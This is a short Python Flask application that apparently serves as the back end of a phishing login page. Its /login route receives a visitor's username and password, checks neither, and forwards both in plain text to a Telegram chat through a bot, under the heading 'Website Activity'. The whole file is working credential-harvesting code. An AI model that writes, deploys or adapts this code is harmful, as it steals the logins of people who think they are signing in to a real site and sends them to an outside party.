import os
import telebot
from flask import Flask, request, render_template

TOKEN = os.environ.get("TELEGRAM_TOKEN")
CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

@app.route("/")
def home():
    return render_template("login_page.html")

@app.route("/login", methods=["POST"])
def login():
    data = request.get_json()
    username = data.get("username")
    password = data.get("password")

    bot.send_message(
        CHAT_ID,
        f"🔔 Website Activity\nUsername: {username}\nPassword: {password}"
    )
    return "ok"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))  # 🔴 IMPORTANT
    app.run(host="0.0.0.0", port=port)
